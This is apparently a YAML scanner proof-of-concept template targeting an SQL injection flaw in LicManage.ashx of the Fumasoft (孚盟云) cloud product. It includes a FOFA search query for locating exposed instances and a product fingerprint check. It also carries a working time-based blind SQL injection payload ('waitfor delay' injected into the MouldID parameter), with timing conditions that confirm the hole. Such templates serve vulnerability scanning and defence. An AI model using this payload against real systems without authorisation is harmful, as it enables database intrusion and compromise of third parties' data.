id: poc-yaml-fumasoft-licmanage-ashx-sqli
info:
  name: 孚盟云 LicManage.ashx SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 孚盟云
  fofa: app="孚盟软件-孚盟云"
variables:
  t1: random_int(4,9)
  t2: t1 + 2
requests:
- method: GET
  path: /
  expression: status_code == 200 && contains(body,"孚盟云")
- method: POST
  path: /Ajax/LicManage.ashx
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: action=ExtensionPermit&MouldID='waitfor+delay'0:0:{{.t1}}'--&BillFID=1
  expression: status_code == 200 && body == "false" && duration > t1 && duration <
    t2
transport: http
